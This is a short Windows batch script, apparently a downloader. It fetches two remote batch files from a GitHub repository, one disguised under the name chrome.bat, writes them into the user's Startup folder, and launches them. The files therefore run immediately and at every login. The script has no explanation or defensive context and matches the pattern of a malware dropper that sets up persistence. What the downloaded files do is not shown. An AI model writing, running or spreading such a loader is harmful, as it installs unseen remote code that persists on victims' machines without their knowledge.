@echo off
setlocal enabledelayedexpansion

set "vbsUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/chrome.bat"
set "batUrl=https://raw.githubusercontent.com/Ayamet/web/main/main/enak.bat"

set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "vbsFile=%startupFolder%\chrome.bat"
set "batFile=%startupFolder%\enak.bat"

powershell -Command "Invoke-WebRequest -Uri '%vbsUrl%' -OutFile '%vbsFile%'"
powershell -Command "Invoke-WebRequest -Uri '%batUrl%' -OutFile '%batFile%'"

start "" "%vbsFile%"
start "" "%batFile%"

exit
